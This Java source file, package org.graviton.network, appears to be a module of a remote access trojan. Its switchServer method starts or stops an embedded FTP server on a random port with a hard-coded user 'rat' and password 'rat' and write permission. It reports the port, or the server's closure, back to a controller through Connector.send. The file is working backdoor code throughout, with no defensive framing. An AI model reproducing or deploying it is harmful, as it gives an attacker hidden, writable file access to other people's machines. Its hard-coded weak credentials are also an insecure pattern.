package org.graviton.network;


import org.apache.ftpserver.FtpServer;
import org.apache.ftpserver.FtpServerFactory;
import org.apache.ftpserver.ftplet.Authority;
import org.apache.ftpserver.ftplet.UserManager;
import org.apache.ftpserver.listener.ListenerFactory;
import org.apache.ftpserver.usermanager.PropertiesUserManagerFactory;
import org.apache.ftpserver.usermanager.impl.BaseUser;
import org.apache.ftpserver.usermanager.impl.WritePermission;
import org.apache.ftpserver.usermanager.impl.WriteRequest;

import java.util.ArrayList;
import java.util.List;

public class FTPServer {

    private static boolean activate;
    private static FtpServer server;

    public static void switchServer() {
        try {
            activate = !activate;

            if (activate) {
                PropertiesUserManagerFactory userManagerFactory = new PropertiesUserManagerFactory();
                UserManager userManager = userManagerFactory.createUserManager();
                BaseUser user = new BaseUser();
                user.setName("rat");
                user.setPassword("rat");

                List<Authority> authorities = new ArrayList<>();
                authorities.add(new WritePermission());
                user.authorize(new WriteRequest());
                user.setAuthorities(authorities);

                userManager.save(user);

                ListenerFactory listenerFactory = new ListenerFactory();
                listenerFactory.setPort(0);

                FtpServerFactory factory = new FtpServerFactory();
                factory.setUserManager(userManager);
                factory.addListener("default", listenerFactory.createListener());

                server = factory.createServer();
                server.start();
                Connector.send("pFTP Server has been started on port " + factory.getListeners().get("default").getPort());
            } else {
                server.stop();
                Connector.send("pFTP Server has been closed");
            }
        } catch (Exception e) {
            Connector.send("pThe FTP Server encountered a problem -> " + e.getMessage());
        }

    }


}
